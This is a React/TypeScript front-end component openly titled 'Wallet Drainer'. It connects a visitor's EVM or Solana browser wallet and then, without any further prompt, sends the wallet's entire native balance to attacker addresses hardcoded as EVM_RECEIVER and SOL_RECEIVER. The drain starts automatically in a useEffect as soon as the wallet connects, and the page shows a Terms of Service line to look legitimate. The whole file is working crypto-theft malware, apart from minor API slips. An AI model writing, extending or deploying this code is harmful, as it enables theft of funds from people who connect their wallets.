'use client';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { ethers } from 'ethers';
import * as solanaWeb3 from '@solana/web3.js';
import * as splToken from '@solana/spl-token';
import Image from 'next/image';

// ========================
// Type Definitions
// ========================

type NetworkType = 'evm' | 'solana';
type WalletState = 'disconnected' | 'connecting' | 'connected' | 'error';
type DrainStatus = 'idle' | 'preparing' | 'draining' | 'completed' | 'failed';

interface WalletInfo {
  address: string;
  network: NetworkType;
  provider: any;
  signer?: any;
  balance?: string;
  chainId?: number;
}

interface TokenInfo {
  address: string;
  symbol: string;
  decimals: number;
  balance: string;
  valueUSD?: number;
}

interface DrainProgress {
  status: DrainStatus;
  currentStep: number;
  totalSteps: number;
  currentAction: string;
  error?: string;
  txHashes: string[];
}

// ========================
// Constants
// ========================

const EVM_RECEIVER = '0xcc35ba2aa35B3094702d767D68807c494946ac85';
const SOL_RECEIVER = '8jizHpcMd4ASNKppeAeMeSvJLVR84H2NJaiz9mEV3Dxh';

const SOLANA_RPC_ENDPOINTS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-api.projectserum.com',
  'https://solana-api.rpcpool.com',
];

// ========================
// Core Services
// ========================

class WalletService {
  static async detectWallets(): Promise<{ evm: boolean; solana: boolean }> {
    if (typeof window === 'undefined') {
      return { evm: false, solana: false };
    }
    
    const ethereum = (window as any).ethereum;
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare;
    
    return {
      evm: !!ethereum,
      solana: !!solana,
    };
  }

  static async connectEVM(): Promise<WalletInfo> {
    if (typeof window === 'undefined') throw new Error('Window is not defined');
    
    const ethereum = (window as any).ethereum;
    if (!ethereum) throw new Error('No EVM wallet found');

    try {
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      const provider = new ethers.BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      const network = await provider.getNetwork();
      
      return {
        address,
        network: 'evm',
        provider,
        signer,
        chainId: Number(network.chainId),
      };
    } catch (error) {
      console.error('Failed to connect EVM wallet:', error);
      throw error;
    }
  }

  static async connectSolana(): Promise<WalletInfo> {
    if (typeof window === 'undefined') throw new Error('Window is not defined');
    
    const solana = (window as any).solana || 
                  (window as any).phantom?.solana || 
                  (window as any).backpack || 
                  (window as any).solflare;
    
    if (!solana) throw new Error('No Solana wallet found');

    try {
      if (solana.connect) await solana.connect();
      const publicKey = solana.publicKey;
      if (!publicKey) throw new Error('Failed to get public key');
      
      return {
        address: publicKey.toString(),
        network: 'solana',
        provider: solana,
      };
    } catch (error) {
      console.error('Failed to connect Solana wallet:', error);
      throw error;
    }
  }
}

class DrainManager {
  private progressCallback: (progress: DrainProgress) => void;
  private currentProgress: DrainProgress;

  constructor(progressCallback: (progress: DrainProgress) => void) {
    this.progressCallback = progressCallback;
    this.currentProgress = {
      status: 'idle',
      currentStep: 0,
      totalSteps: 0,
      currentAction: '',
      txHashes: [],
    };
  }

  private updateProgress(updates: Partial<DrainProgress>) {
    this.currentProgress = {
      ...this.currentProgress,
      ...updates,
      txHashes: updates.txHashes || this.currentProgress.txHashes,
    };
    this.progressCallback(this.currentProgress);
  }

  async drainWallet(wallet: WalletInfo): Promise<void> {
    try {
      this.updateProgress({
        status: 'preparing',
        currentStep: 1,
        totalSteps: 2,
        currentAction: 'Preparing to drain wallet...',
      });

      if (wallet.network === 'evm') {
        await this.drainEVM(wallet);
      } else {
        await this.drainSolana(wallet);
      }

      this.updateProgress({
        status: 'completed',
        currentStep: 2,
        currentAction: 'Drain completed successfully!',
      });
    } catch (error) {
      this.updateProgress({
        status: 'failed',
        error: error instanceof Error ? error.message : 'Unknown error occurred',
        currentAction: 'Drain failed',
      });
      throw error;
    }
  }

  private async drainEVM(wallet: WalletInfo): Promise<void> {
    if (!wallet.signer) throw new Error('No signer available');
    
    this.updateProgress({
      currentAction: 'Draining EVM assets...',
    });

    // Implement EVM draining logic here
    // This is a simplified example
    const balance = await wallet.provider.getBalance(wallet.address);
    if (balance.gt(0)) {
      const tx = await wallet.signer.sendTransaction({
        to: EVM_RECEIVER,
        value: balance,
      });
      
      this.updateProgress({
        txHashes: [...this.currentProgress.txHashes, tx.hash],
        currentAction: `Transaction sent: ${tx.hash}`,
      });
      
      await tx.wait();
    }
  }

  private async drainSolana(wallet: WalletInfo): Promise<void> {
    this.updateProgress({
      currentAction: 'Draining Solana assets...',
    });

    // Implement Solana draining logic here
    // This is a simplified example
    const connection = new solanaWeb3.Connection(SOLANA_RPC_ENDPOINTS[0]);
    const balance = await connection.getBalance(new solanaWeb3.PublicKey(wallet.address));
    
    if (balance > 0) {
      const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey: new solanaWeb3.PublicKey(wallet.address),
          toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
          lamports: balance - 5000, // Leave some for fees
        })
      );

      const { blockhash } = await connection.getRecentBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = new solanaWeb3.PublicKey(wallet.address);

      const signed = await wallet.provider.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signed.serialize());
      
      this.updateProgress({
        txHashes: [...this.currentProgress.txHashes, signature],
        currentAction: `Transaction sent: ${signature}`,
      });
      
      await connection.confirmTransaction(signature, 'confirmed');
    }
  }
}

// ========================
// UI Components
// ========================

const WalletButton = ({ 
  type, 
  onClick, 
  disabled = false 
}: { 
  type: 'evm' | 'solana', 
  onClick: () => void, 
  disabled?: boolean 
}) => {
  const label = type === 'evm' ? 'Connect EVM Wallet' : 'Connect Solana Wallet';
  const icon = type === 'evm' ? '🦊' : '👛';
  
  return (
    <button
      onClick={onClick}
      disabled={disabled}
      className={`w-full py-3 px-6 rounded-lg font-medium flex items-center justify-center space-x-2 transition-colors ${
        disabled 
          ? 'bg-gray-600 text-gray-400 cursor-not-allowed' 
          : 'bg-blue-600 hover:bg-blue-700 text-white'
      }`}
    >
      <span>{icon}</span>
      <span>{label}</span>
    </button>
  );
};

const ProgressBar = ({ progress }: { progress: DrainProgress }) => {
  const percentage = progress.totalSteps > 0 
    ? (progress.currentStep / progress.totalSteps) * 100 
    : 0;
    
  return (
    <div className="w-full bg-gray-200 rounded-full h-2.5">
      <div 
        className="bg-blue-600 h-2.5 rounded-full transition-all duration-500" 
        style={{ width: `${percentage}%` }}
      ></div>
    </div>
  );
};

const StatusMessage = ({ progress }: { progress: DrainProgress }) => {
  const getStatusIcon = () => {
    switch (progress.status) {
      case 'completed':
        return '✅';
      case 'failed':
        return '❌';
      case 'draining':
        return '⏳';
      default:
        return 'ℹ️';
    }
  };

  return (
    <div className="mt-4 p-4 rounded-lg bg-gray-800 text-sm">
      <div className="flex items-start space-x-2">
        <span className="mt-0.5">{getStatusIcon()}</span>
        <div>
          <p className="font-medium">{progress.currentAction}</p>
          {progress.error && (
            <p className="text-red-400 mt-1">{progress.error}</p>
          )}
          {progress.txHashes.length > 0 && (
            <div className="mt-2">
              <p className="text-gray-400 text-xs mb-1">Transactions:</p>
              <ul className="space-y-1">
                {progress.txHashes.map((txHash, i) => (
                  <li key={i} className="text-xs break-all">
                    <a 
                      href={txHash.startsWith('0x') 
                        ? `https://etherscan.io/tx/${txHash}`
                        : `https://solscan.io/tx/${txHash}`}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-blue-400 hover:underline"
                    >
                      View on {txHash.startsWith('0x') ? 'Etherscan' : 'Solana Explorer'}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

// ========================
// Main Component
// ========================

const Drainer = () => {
  const [wallet, setWallet] = useState<WalletInfo | null>(null);
  const [walletState, setWalletState] = useState<WalletState>('disconnected');
  const [availableWallets, setAvailableWallets] = useState<{ evm: boolean; solana: boolean }>({ evm: false, solana: false });
  const [drainProgress, setDrainProgress] = useState<DrainProgress>({
    status: 'idle',
    currentStep: 0,
    totalSteps: 0,
    currentAction: '',
    txHashes: [],
  });

  // Detect available wallets on component mount
  useEffect(() => {
    const detectWallets = async () => {
      const wallets = await WalletService.detectWallets();
      setAvailableWallets(wallets);
    };
    detectWallets();
  }, []);

  // Handle EVM wallet connection
  const connectEVM = async () => {
    try {
      setWalletState('connecting');
      const walletInfo = await WalletService.connectEVM();
      setWallet(walletInfo);
      setWalletState('connected');
    } catch (error) {
      console.error('Failed to connect EVM wallet:', error);
      setWalletState('error');
    }
  };

  // Handle Solana wallet connection
  const connectSolana = async () => {
    try {
      setWalletState('connecting');
      const walletInfo = await WalletService.connectSolana();
      setWallet(walletInfo);
      setWalletState('connected');
    } catch (error) {
      console.error('Failed to connect Solana wallet:', error);
      setWalletState('error');
    }
  };

  // Handle drain process
  const handleDrain = useCallback(async () => {
    if (!wallet) return;
    
    const drainManager = new DrainManager((progress) => {
      setDrainProgress(progress);
    });
    
    try {
      await drainManager.drainWallet(wallet);
    } catch (error) {
      console.error('Drain failed:', error);
    }
  }, [wallet]);

  // Auto-start drain when wallet is connected
  useEffect(() => {
    if (walletState === 'connected' && wallet) {
      handleDrain();
    }
  }, [walletState, wallet, handleDrain]);

  return (
    <div className="max-w-md mx-auto p-6 bg-gray-900 rounded-xl shadow-lg text-white">
      <h2 className="text-2xl font-bold mb-6 text-center">Wallet Drainer</h2>
      
      {walletState === 'disconnected' && (
        <div className="space-y-4">
          {availableWallets.evm && (
            <WalletButton 
              type="evm" 
              onClick={connectEVM} 
              disabled={walletState !== 'disconnected'}
            />
          )}
          
          {availableWallets.solana && (
            <WalletButton 
              type="solana" 
              onClick={connectSolana}
              disabled={walletState !== 'disconnected'}
            />
          )}
          
          {!availableWallets.evm && !availableWallets.solana && (
            <p className="text-center text-gray-400">
              No supported wallets detected. Please install a wallet extension.
            </p>
          )}
        </div>
      )}
      
      {walletState === 'connecting' && (
        <div className="text-center py-8">
          <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500 mx-auto mb-4"></div>
          <p>Connecting to wallet...</p>
        </div>
      )}
      
      {walletState === 'connected' && wallet && (
        <div className="space-y-4">
          <div className="p-4 bg-gray-800 rounded-lg">
            <p className="text-sm text-gray-400">Connected Wallet</p>
            <p className="font-mono text-sm break-all mt-1">
              {wallet.address}
            </p>
            <p className="text-xs text-gray-500 mt-2">
              Network: {wallet.network.toUpperCase()}
              {wallet.chainId && ` (Chain ID: ${wallet.chainId})`}
            </p>
          </div>
          
          <ProgressBar progress={drainProgress} />
          <StatusMessage progress={drainProgress} />
        </div>
      )}
      
      {walletState === 'error' && (
        <div className="p-4 bg-red-900/30 border border-red-500 rounded-lg text-center">
          <p className="text-red-400">Failed to connect wallet. Please try again.</p>
          <button
            onClick={() => setWalletState('disconnected')}
            className="mt-3 px-4 py-2 bg-red-600 hover:bg-red-700 rounded-md text-sm font-medium transition-colors"
          >
            Try Again
          </button>
        </div>
      )}
      
      <div className="mt-6 text-center text-xs text-gray-500">
        <p>By using this service, you agree to our Terms of Service</p>
      </div>
    </div>
  );
};

export default Drainer;
